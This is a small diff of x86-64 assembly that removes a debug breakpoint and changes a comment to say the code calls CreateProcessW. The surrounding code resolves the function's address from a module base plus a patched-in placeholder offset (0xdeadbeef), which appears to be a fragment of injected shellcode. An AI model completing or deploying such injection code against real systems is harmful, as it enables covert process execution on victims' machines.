@@ -1,4 +1,3 @@
-int 3
 cmp dl, 1
 jne exitNow
 push rdi
@@ -33,7 +32,7 @@ mov rax, [rax]
 mov rax, [rax + 0x30]
 xor r12, r12
 mov r12d, 0xdeadbeef 
-add rax, r12	;now RAX has is the address of CreateProcessA
+add rax, r12	;now RAX has is the address of CreateProcessW
 
 call rax
 add rsp, 224
